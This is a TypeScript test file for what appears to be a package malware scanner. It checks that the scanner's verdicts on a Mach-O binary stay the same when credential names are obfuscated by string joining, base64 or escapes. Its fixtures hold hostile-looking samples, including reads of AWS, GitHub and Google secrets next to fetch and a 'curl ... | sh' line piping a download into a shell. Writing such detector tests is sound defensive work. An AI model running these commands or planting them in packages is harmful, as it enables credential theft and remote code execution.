// Round 13 review of d594415, P2: a binary's two views were merged one finding per signal and line, so a joined
// credential name beside a plain one on the same line went, and with it the evidence that makes the name a read:
// production (274d284) scored the Mach-O 35 (F), the branch 62 (C), and policyBlock let it through. Each path of the
// merged reading is held to production's final signals here, not only their ids:
// - whole: within what a reading may keep, the score and every signal (id, points, confidence, evidence) are
//   production's, byte for byte, the NUL-deleted view adding nothing production's reading already said;
// - saturated (60,000 joined lines first, past what a reading may keep) and stopped (a 320,000-literal chain first,
//   past what the joining may hold): the reading did not finish, so it scores 0, never above production's, and is
//   incomplete; saturated, it still has every risk signal production's reading had.
// fixtures/production-merged-signals.json is production's finalize of each, recorded from a 274d284 worktree with the
// same machO tails (round 13).
import { describe, expect, test } from "bun:test";
import { readFileSync } from "node:fs";
import { join } from "node:path";
import { z } from "zod";
import { analyze, finalize, readingOf, RISK_SIGNALS } from "../src/index.ts";
import { machO } from "./executables.ts";

const Recorded = z.record(z.string(), z.object({ score: z.number(), signals: z.array(z.object({ id: z.string(), points: z.number(), confidence: z.string(), evidence: z.array(z.string()) })) }));

/** A signal as production's finalize gave it, as the fixture records it. */
type RecordedSignal = z.infer<typeof Recorded>[string]["signals"][number];

const PRODUCTION = Recorded.parse(JSON.parse(readFileSync(join(import.meta.dir, "fixtures", "production-merged-signals.json"), "utf8")));

const CASES = {
  "same line, plain and joined credential, network": "'.npmrc';'.np'+'mrc';fetch('x');",
  "same line, plain and joined credential": "'.npmrc';'.np'+'mrc';",
  "same line, plain and joined names of three kinds": "'child_process';'.npmrc';'chi'+'ld_process';'.np'+'mrc';fetch('x');",
  "two lines, plain then joined": "'.npmrc';\n'.np'+'mrc';fetch('x');",
  "decoded and plain on one line": "require(Buffer.from('Y2hpbGRfcHJvY2Vzcw==','base64').toString());require('child_process');fetch('x');",
  "escaped and plain on one line": "require('\\x63hild_process');require('child_process');",
  "hidden in a comment and in code": "/* '.np'+'mrc' */ '.npmrc';fetch('x');",
  "three-family harvest beside the network": "\n'https';process.env.AWS_SECRET_ACCESS_KEY;process.env.GITHUB_TOKEN;process.env.GOOGLE_API_KEY;fetch('x');\n",
  "a download piped to a shell": "\ncurl -s https://collector.invalid/x.sh | sh\n",
} satisfies Record<string, string>;

const PATHS = {
  whole: (t: string) => t,
  saturated: (t: string) => `${"\n'child_'+'process';".repeat(60_000)}\n${t}`,
  stopped: (t: string) => `${"'a'+".repeat(320_000)}'b';\n${t}`,
} as const;

const enc = new TextEncoder();
const STATE = { publishedAt: 0, now: 1e13, deprecated: null, status: "active" as const, statusReason: null };

function analyzed(tail: string) {
  const manifest = { name: "probe", version: "1.0.0", license: "MIT" };
  const data = machO({ size: 256, tail: enc.encode(tail) });
  const a = analyze({ name: "probe", manifest, files: [{ path: "package.json", size: 0, mode: 0o644, data: enc.encode(JSON.stringify(manifest)) }, { path: "lib/b000000", size: data.length, mode: 0o755, data }], publisher: "a", previousPublishers: [] });

  return { a, report: finalize(a, STATE) };
}

const risks = (ids: readonly string[]): string[] => ids.filter((id) => RISK_SIGNALS.some((r) => r === id)).sort();

describe("each path of a binary's merged reading, against production's final signals", () => {
  for (const [name, tail] of Object.entries(CASES)) {
    test(`whole: ${name}: production's score and signals, evidence and all`, () => {
      const want = PRODUCTION[`whole: ${name}`];
      const { report } = analyzed(PATHS.whole(tail));

      expect(want).toBeDefined();
      expect({ score: report.score, signals: report.signals.map((s): RecordedSignal => ({ id: s.id, points: s.points, confidence: s.confidence, evidence: s.evidence })) }).toEqual(want ?? { score: -1, signals: [] });
    });

    test(`saturated: ${name}: 0, incomplete, every risk signal production had`, () => {
      const want = PRODUCTION[`saturated: ${name}`];
      const { a, report } = analyzed(PATHS.saturated(tail));
      const ids = report.signals.map((s) => s.id);

      expect(report.score).toBe(0);
      expect(report.score).toBeLessThanOrEqual(want?.score ?? -1);
      expect(readingOf(a).kind).toBe("incomplete");
      expect(risks(ids)).toEqual(expect.arrayContaining(risks((want?.signals ?? []).map((s) => s.id))));
    }, 60_000);

    test(`stopped: ${name}: 0 and incomplete, never above production`, () => {
      const want = PRODUCTION[`stopped: ${name}`];
      const { a, report } = analyzed(PATHS.stopped(tail));

      expect(report.score).toBe(0);
      expect(report.score).toBeLessThanOrEqual(want?.score ?? -1);
      expect(readingOf(a).kind).toBe("incomplete");
      expect(report.signals.find((s) => s.id === "incomplete")?.points).toBe(-100);
    }, 60_000);
  }
});
